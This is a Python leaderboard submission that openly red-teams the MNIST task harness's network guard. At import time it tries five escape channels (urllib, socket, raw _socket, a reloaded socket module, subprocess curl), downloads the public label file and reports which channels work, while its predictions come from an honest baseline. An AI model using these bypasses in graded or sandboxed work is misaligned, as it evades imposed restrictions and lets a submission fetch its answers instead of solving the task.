#!POPCORN leaderboard mnist-medium-12pct
#!POPCORN gpu A100

"""RED TEAM: does the network guard actually stop a submission fetching MNIST?

What it attacks
  utils.install_network_guard, which rule 3 of the README presents to
  participants as "no network access". If a submission can reach the internet
  it does not need a 320 KB embedded table at all: the label file it needs is
  29 KB and the images are 9.9 MB, both on public URLs, and both can be pulled
  during the untimed import or the untimed warm-up call.

How it works
  At import time -- after the guard is installed and before any timed call --
  it tries five ways out, in increasing order of rudeness, and reports which
  ones work on stderr. It then actually downloads the public MNIST *label*
  file through the first channel that works and prints its MD5, which is the
  proof that the data arrived intact:

    1. urllib.request.urlopen              (patched by the guard)
    2. socket.socket().connect             (patched by the guard)
    3. _socket.socket().connect            (the C base class the guard's
                                            subclass patch does not cover)
    4. importlib.reload(socket)            (re-imports clean function objects)
    5. subprocess curl                     (a different process entirely)

  Predictions come from the nearest-class-mean baseline, so the run completes
  normally and the probe's findings show up in the harness's stderr rather
  than as a crash.

Expected harness response
  A refusal at every channel. Anything else means rule 3 is advisory, and the
  hold-out check is the only thing standing between the leaderboard and a
  submission that downloads its answers.
"""

import hashlib
import sys

import torch

from task import input_t, output_t

LABEL_URL = "https://ossci-datasets.s3.amazonaws.com/mnist/train-labels-idx1-ubyte.gz"
HOST, PORT = "ossci-datasets.s3.amazonaws.com", 443
REPORT = []


def note(channel, outcome):
    REPORT.append(f"[netprobe] {channel}: {outcome}")


def try_urlopen():
    import urllib.request

    with urllib.request.urlopen(LABEL_URL, timeout=30) as response:
        return response.read()


def try_socket_connect():
    import socket

    sock = socket.socket()
    sock.settimeout(10)
    sock.connect((HOST, PORT))
    sock.close()
    return b""


def try_raw_socket():
    """socket.socket subclasses _socket.socket; the guard patched the subclass."""
    import _socket

    sock = _socket.socket()
    sock.settimeout(10)
    sock.connect((HOST, PORT))
    sock.close()
    return b""


def try_reloaded_socket():
    """Re-importing socket rebuilds connect and create_connection from scratch."""
    import importlib
    import socket
    import ssl

    importlib.reload(socket)
    raw = socket.create_connection((HOST, PORT), timeout=30)
    tls = ssl.create_default_context().wrap_socket(raw, server_hostname=HOST)
    tls.sendall(
        f"GET /mnist/train-labels-idx1-ubyte.gz HTTP/1.1\r\nHost: {HOST}\r\n"
        "Connection: close\r\n\r\n".encode()
    )
    chunks = []
    while True:
        block = tls.recv(65536)
        if not block:
            break
        chunks.append(block)
    tls.close()
    payload = b"".join(chunks)
    return payload.split(b"\r\n\r\n", 1)[1]


def try_subprocess():
    import subprocess

    return subprocess.run(
        ["curl", "-sS", "--max-time", "60", LABEL_URL], capture_output=True, check=True
    ).stdout


for name, attempt in (
    ("urllib.request.urlopen", try_urlopen),
    ("socket.socket().connect", try_socket_connect),
    ("_socket.socket().connect", try_raw_socket),
    ("importlib.reload(socket)", try_reloaded_socket),
    ("subprocess curl", try_subprocess),
):
    try:
        data = attempt()
    except BaseException as error:  # noqa: BLE001 - a probe reports, never raises
        note(name, f"blocked ({type(error).__name__}: {error})")
        continue
    if data:
        note(
            name,
            f"REACHED THE INTERNET, {len(data)} bytes of the public MNIST label "
            f"file, md5 {hashlib.md5(data).hexdigest()} "
            f"(expected d53e105ee54ea40749a09fcbcd1e9432)",
        )
    else:
        note(name, "REACHED THE INTERNET (TCP connect to the MNIST host succeeded)")

print("\n".join(REPORT), file=sys.stderr, flush=True)


def custom_kernel(data: input_t) -> output_t:
    train_x, train_y, test_x = data
    x = train_x.reshape(train_x.shape[0], -1)
    q = test_x.reshape(test_x.shape[0], -1)
    sums = torch.zeros(10, x.shape[1], device=x.device, dtype=x.dtype).index_add_(0, train_y, x)
    means = sums / torch.bincount(train_y, minlength=10).clamp_min(1).unsqueeze(1)
    return ((means * means).sum(1) - 2 * q @ means.T).argmin(1)
